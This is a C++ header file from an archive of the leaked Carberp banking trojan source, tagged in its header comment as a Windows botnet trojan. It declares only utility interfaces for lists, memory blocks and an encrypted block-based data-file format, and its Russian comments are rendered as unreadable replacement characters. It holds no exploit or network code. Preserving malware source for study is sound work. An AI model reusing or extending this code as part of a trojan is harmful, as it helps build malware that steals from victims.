/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef BotClassesH
#define BotClassesH


//---------------------------------------------------------------------------

#include <windows.h>
#include "Crypt.h"



/*----------------  ������ ��� ������ �� �������� ��������� -----------------*/

typedef LPVOID PList;

typedef void (*TFreeItemMethod)(LPVOID);

namespace List
{
	// ������� �������� ������
	PList Create();

	// ������� ����������� ������
	void Free(PList List);

	// ������� ������� ������
	void Clear(PList List);

	// ������� ���������� ���������� ��������� ������
	DWORD Count(PList List);

	// ������� ��������� ����� �������
	int Add(PList List, LPVOID Item);

	// ������� ������� ������� �� ������
	void Delete(PList List, DWORD Index);

	// ������� �� ������ �������
	int Remove(PList List, LPVOID Item);

	// ������� �������
	 LPVOID Extract(PList List, DWORD Index);

	// ������� ���������� ������� �������� � ������
	int IndexOf(PList List, LPVOID Item);

	// ������� ������������� �������� �������� � ��������� ������� Index
	void SetItem(PList List, DWORD Index, LPVOID Item);

	// ������� ���������� �������� �������� �� ������� Index
	LPVOID GetItem(PList List, DWORD Index);

	// �������� ������ ������������������ ���������
	bool SetCapacity(PList List, DWORD Value);

	// ���������� ����� ��������������� �������� ���������
	void SetFreeItemMehod(PList List, TFreeItemMethod Method);

	// ������� ���������� ��������� ������� ������
	LPVOID Last(PList List);
}


//---------------------------------------------------------------------------
//  MEMBLOCKS - ������� ��� ������ � ������� ������, �������� ������
//---------------------------------------------------------------------------
typedef struct TMemBlock
{
	DWORD ID;    // ������������� �����, ��������������� ��� ������ � ����
	DWORD Size;
	LPVOID Data;
}*PMemBlock;

typedef LPVOID PMemBlockList;

namespace MEMBLOCK
{
	// ������� ������ ������
	PMemBlockList CreateList();

	// ���������� ������ ������
	void FreeList(PMemBlockList List);

	// �������� ����� ���� � ������
    PMemBlock AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy = true);

	// ���������� ���� ������. �����!!!! ������ ������������ ������ �����, �� ��
	// ������� ���� �� ������ (���� �� � ��� ���������);
	void FreeBlock(PMemBlock Block);

	// ������� ������������ ����� ������ ������ ���� ������ ������
	DWORD Size(PMemBlockList List);

	// ������� �������� ������ ���� ������ � ����� Buf.
	// ���������������, ��� Buf ����� �������� � ���� ��� �����
    void BuildToBuf(PMemBlockList List, LPVOID Buf);

	// ������� �������� ��� ����� � ������
	PCHAR BuildAsStr(PMemBlockList List, DWORD *TotalSize);

	// ������� �������� ��� ����� � ������
	LPVOID BuildAsMem(PMemBlockList List, DWORD *TotalSize);

	// ������� ���������� ����� � ����
	PMemBlock Pack(PMemBlockList List);

	// �������� ���� �� ��������������
	PMemBlock GetBlockByID(PMemBlockList List, DWORD ID);
	PCHAR GetBlockByAsStr(PMemBlockList List, DWORD ID);
}


//---------------------------------------------------------------------------
//  DataFile - ������ ��� ������ � ������� �������
//---------------------------------------------------------------------------

#pragma pack(push, 1)
typedef struct TDataFileHead
{
	DWORD Signature;  // ��������� �����
	DWORD Version;    // ������ �����
	DWORD FileID;     // ������������� �����
	DWORD Flags;      // ����� �����
	DWORD FlagsEx;    // �������������� �����
} *PDataFileHead;
#pragma pack(pop)


enum TFileCryptMode {fcNone, fcBlock, fcFile};

typedef struct TDataFile
{
	HANDLE Handle;              // ������������� �����
	TDataFileHead Head;         // ��������� �����
	TFileCryptMode CryptMode;   // ����� ���������� ������ �����
	TCryptMethod CryptMethod;   // ����� �����������
	TCryptMethod DecryptMethod; // ����� ����������� ������
	LPVOID CryptKey;            // ���� ����������
	PMemBlockList Blocks;       // ������ ������
} *PDataFile;


#define DATA_FILE_VERSION 1

// ������� ���������� DWORD �� ������ ���������
#define SIGNATURE(Pointer) (*(DWORD*)Pointer)

namespace DataFile
{
	// ������� ������ ���� � ������ FileName, ������ ��������� ��������
	// ����� �� ��� ���� ������ � ���� �� ����������
    PDataFile CreateFile(PCHAR FileName, DWORD Signature);

	// ������� ��������� ���� ��� ������ � ������ �� ���� ���������
	PDataFile OpenFile(PCHAR FileName, DWORD Signature);

	// ���������� ������ �� ��������� File � ���������� ����
	bool WriteFile(PDataFile File);

	// ������ ������ �� ����������� ����� � ��������� File
	bool ReadFile(PDataFile File);

	// ������� ��������� ���� � ���������� ��������� File
    void CloseFile(PDataFile File);

	// �������� ���� ������
	void AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy = true);
	void AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData);

	// �������� ����� ������ � ����
	bool WriteBlocksToFile(PDataFile File);

	// �������� ����� ������ � ����
	bool ReadBlocksFromFile(PDataFile File);

	// ����������� ����� ������
    bool CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method);
}


///---------------------------------------------------------------------------
#endif
